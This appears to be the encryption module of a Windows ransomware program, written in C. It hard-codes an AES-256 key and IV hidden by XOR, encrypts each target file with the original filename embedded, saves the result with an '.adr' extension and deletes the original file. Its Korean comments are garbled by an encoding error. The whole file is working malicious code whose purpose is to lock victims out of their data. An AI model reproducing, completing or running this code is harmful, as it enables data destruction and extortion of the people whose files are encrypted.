#include "encryptor.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <openssl/evp.h>

#define FILENAME_PADDING 256

// XOR ����ũ
static const unsigned char xor_mask = 0xA5;

// ����ȭ�� AES-256 Ű (�� 32����Ʈ)
static const unsigned char obfuscated_key[32] = {
    0x14, 0x5d, 0x52, 0x3b, 0xd8, 0xa7, 0xa4, 0xeb,
    0x9d, 0x00, 0x6c, 0x42, 0x26, 0x8d, 0xd3, 0x18,
    0x5f, 0x12, 0x22, 0xad, 0xb8, 0xc2, 0x1a, 0x5f,
    0xac, 0x71, 0x96, 0x9e, 0xce, 0xc7, 0x6b, 0xd9
};

// ����ȭ�� IV (16����Ʈ)
static const unsigned char obfuscated_iv[16] = {
    0x99, 0xdb, 0xbc, 0xef, 0xa5, 0x77, 0xf0, 0x16,
    0x33, 0x84, 0x5b, 0xcb, 0x01, 0xac, 0x75, 0x69
};

// Ű ����
void restore_key(unsigned char* key_out) {
    for (int i = 0; i < AES_KEY_SIZE; i++) {
        key_out[i] = obfuscated_key[i] ^ xor_mask;
    }
}

// IV ����
void restore_iv(unsigned char* iv_out) {
    for (int i = 0; i < AES_BLOCK_SIZE; i++) {
        iv_out[i] = obfuscated_iv[i] ^ xor_mask;
    }
}

// ���� ��ȣȭ
void encrypt_file(const char* filepath, const unsigned char* key, const unsigned char* iv) {
    printf("[DEBUG] encrypt_file() ȣ��: %s\n", filepath); // ������

    FILE* in = fopen(filepath, "rb");
    if (!in) {
        printf("[!] ���� ���� ����: %s\n", filepath);
        return;
    }

    fseek(in, 0, SEEK_END);
    long fsize = ftell(in);
    rewind(in);

    unsigned char* buffer = malloc(fsize + FILENAME_PADDING);
    if (!buffer) {
        fclose(in);
        printf("[!] �޸� �Ҵ� ���� (buffer)\n");
        return;
    }

    fread(buffer, 1, fsize, in);
    fclose(in);

    memset(buffer + fsize, 0, FILENAME_PADDING);
    const char* fname = strrchr(filepath, '\\') ? strrchr(filepath, '\\') + 1 : filepath;
    strncpy((char*)(buffer + fsize), fname, FILENAME_PADDING - 1);

    int outlen1 = 0, outlen2 = 0;
    int total_len = (int)(fsize + FILENAME_PADDING + EVP_MAX_BLOCK_LENGTH);
    unsigned char* outbuf = malloc(total_len);
    if (!outbuf) {
        free(buffer);
        printf("[!] �޸� �Ҵ� ���� (outbuf)\n");
        return;
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, outbuf, &outlen1, buffer, (int)(fsize + FILENAME_PADDING));
    EVP_EncryptFinal_ex(ctx, outbuf + outlen1, &outlen2);
    EVP_CIPHER_CTX_free(ctx);

    char newname[MAX_PATH];
    snprintf(newname, MAX_PATH, "%s.adr", filepath);
    FILE* out = fopen(newname, "wb");
    if (!out) {
        printf("[!] ��ȣȭ ��� ���� ����: %s\n", newname);
        free(buffer);
        free(outbuf);
        return;
    }

    fwrite(outbuf, 1, outlen1 + outlen2, out);
    fclose(out);

    free(buffer);
    free(outbuf);
    DeleteFileA(filepath);

    printf("[+] ��ȣȭ �Ϸ�: %s �� %s\n", filepath, newname);
}
